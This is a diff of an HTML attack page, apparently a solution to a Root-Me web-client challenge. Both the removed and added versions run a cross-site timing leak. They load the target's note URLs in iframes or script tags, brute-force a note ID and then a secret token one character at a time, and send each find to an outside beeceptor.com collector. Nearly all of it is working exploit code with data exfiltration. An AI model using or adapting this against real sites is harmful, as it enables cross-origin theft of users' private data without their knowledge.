@@ -1,140 +1,147 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Load URLs in Iframe</title>
-    <style>
-        iframe {
-            width: 100%;
-            height: 600px;
-            border: 1px solid #ccc;
-        }
-
-        #status {
-            margin-top: 20px;
-            font-size: 16px;
-        }
-    </style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
 </head>
 <body>
-
-    <h1>Loading URLs in Iframe</h1>
-    <div id="status">Starting to load...</div>
-    <iframe id="iframe"></iframe>
-    <pre id="log"></pre> <!-- Display loading times -->
-
-    <script>
-        const start = 3060;
-        const end = 3070;
-        const iframe = document.getElementById('iframe');
-        const status = document.getElementById('status');
-        const logElement = document.getElementById('log');
-        const alphabet = "abcdefghijklmnopqrstuvwxyz";
-        let valid = 0;
-        let lastValidUrl = "";
-        let foundId = null;
-
-        fetch("https://rootmexsleak.free.beeceptor.com/visited");
-
-
-        function loadUrl(url) {
-            iframe.src = url;
-        }
-
-        function loadNextNote(currentIndex) {
-            if (currentIndex > end) {
-                status.textContent = "Finished loading all notes.";
-                return;
-            }
-
-            const url = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${currentIndex}`;
-            status.textContent = `Loading: ${url}`;
-
-            const startTime = performance.now();
-            loadUrl(url);
-
-            iframe.onerror = function () {
-                console.log("Error loading:", url);
-            }
-
-            iframe.onload = function () {
-                const endTime = performance.now();
-                const loadTime = Math.round(endTime - startTime);
-
-                if (loadTime > 100) {
-                    valid += 1;
-                } else {
-                    valid = 0;
-                }
-
-                setTimeout(() => {
-                    if (valid < 4 && loadTime > 90) {
-                        loadNextNote(currentIndex);
-                    } else if (valid >= 4) {
-                        foundId = currentIndex;
-                        fetch("https://rootmexsleak.free.beeceptor.com/id/" + foundId);
-                        startSearch(foundId, "");
-                    } else {
-                        loadNextNote(currentIndex + 1);
-                    }
-                }, 0);
-            };
-        }
-
-        function startSearch(id, searchStr, hit = false) {
-            const url = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${id}/${searchStr}`;
-            status.textContent = `Searching: ${url}`;
-
-            const startTime = performance.now();
-            loadUrl(url);
-
-            iframe.onload = function () {
-                const endTime = performance.now();
-                const loadTime = Math.round(endTime - startTime);
-
-                if (loadTime > 1000) {
-                    lastValidUrl = url;
-                    startSearch(id, searchStr + alphabet[0], true); // Add a new letter
-                } else {
-                    // Move to the next letter in the alphabet
-                    let nextQuery = getNextQuery(searchStr);
-                    if (nextQuery) {
-                        startSearch(id, nextQuery, hit);
-                    } else {
-                        searchStr = searchStr.slice(0, -1);
-
-                        if (hit) {
-                            hit = false;
-                            fetch("https://rootmexsleak.free.beeceptor.com/res/" + searchStr);
-                        }
-
-                        nextQuery = getNextQuery(searchStr);
-                        if (nextQuery) {
-                            startSearch(id, nextQuery, hit);
-                        } else {
-                            return;
-                        }
-                    }
-                }
-            };
-        }
-
-        function getNextQuery(currentStr) {
-            if (currentStr === "") return "a"; // Start with 'a'
-
-            let chars = currentStr.split("");
-            const lastChar = chars[chars.length - 1];
-
-            if (lastChar == 'z') {
-                return null;
-            } else {
-                return currentStr.slice(0, -1) + String.fromCharCode(lastChar.charCodeAt(0) + 1);
-            }
-        }
-
-        startSearch(1, "");
-    </script>
-
+    <iframe id="ff" frameborder="0"></iframe>
 </body>
+<script>
+    // prettier-ignore
+    const ALPHABET_UPPER = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];
+    const ALPHABET_LOWER = ALPHABET_UPPER.map((c) => c.toLowerCase());
+    const NUMBERS = [...Array(10).keys()];
+    const CHAR_LIST = [
+        ...ALPHABET_LOWER,
+        ...ALPHABET_UPPER,
+        ...NUMBERS,
+        "&",
+        "é",
+        '"',
+        "'",
+        "(",
+        "-",
+        "è",
+        "_",
+        "ç",
+        "à",
+        ")",
+        "=",
+        "~",
+        "#",
+        "{",
+        "[",
+        "|",
+        "`",
+        "\\",
+        "^",
+        "@",
+        "]",
+        "}",
+        ",",
+        ";",
+        ":",
+        "!",
+        "?",
+        ".",
+        "/",
+        "§",
+        "^",
+        "¨",
+        "$",
+        "£",
+        "€",
+        "ù",
+        "%",
+        "*",
+        "µ",
+        "°",
+        "¤",
+        "<",
+        ">",
+        "²",
+        "+",
+    ].map(encodeURIComponent);
+
+    let baseUrl =
+        "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
+
+    const endpoint = "https://rootmexsleak2.free.beeceptor.com/";
+
+    let c = 0;
+    let id = 392;
+    let token = encodeURIComponent("zc4r3_4b0ut_+s4mes1t3_c");
+    let isSearching = true;
+
+    const findId = async () => {
+        const loopPromise = () =>
+            new Promise((resolve) => {
+                const sss = document.createElement("script");
+                sss.onload = () => {
+                    isSearching = false;
+                    document.body.removeChild(sss);
+                    resolve();
+                };
+                sss.onerror = () => {
+                    id += 1;
+                    document.body.removeChild(sss);
+                    resolve();
+                };
+                sss.src = baseUrl + id;
+                document.body.appendChild(sss);
+            });
+
+        while (isSearching) {
+            await loopPromise();
+            if (id % 100 === 0) {
+                fetch(endpoint + "?passed=" + id);
+            }
+        }
+
+        isSearching = true;
+        fetch(endpoint + "?id=" + id);
+        baseUrl = baseUrl + id + "/";
+    };
+
+    const findToken = async () => {
+        const loopPromise = () =>
+            new Promise((resolve) => {
+                const start = performance.now();
+                ff.onload = () => {
+                    const timing = performance.now() - start;
+                    if (
+                        timing < 1000 ||
+                        (token + CHAR_LIST[c]).startsWith("f")
+                    ) {
+                        // not found
+                        c += 1;
+                        if (c === CHAR_LIST.length) {
+                            isSearching = false;
+                        }
+                    } else {
+                        // found
+                        token += CHAR_LIST[c];
+                        c = 0;
+                        fetch(endpoint + "?search=" + token);
+                    }
+                    resolve();
+                };
+                ff.src = baseUrl + token + CHAR_LIST[c];
+            });
+
+        while (isSearching) {
+            await loopPromise();
+        }
+
+        fetch(endpoint + "?done=" + token);
+    };
+
+    const main = async () => {
+        await findId();
+        await findToken();
+    };
+    main();
+</script>
 </html>
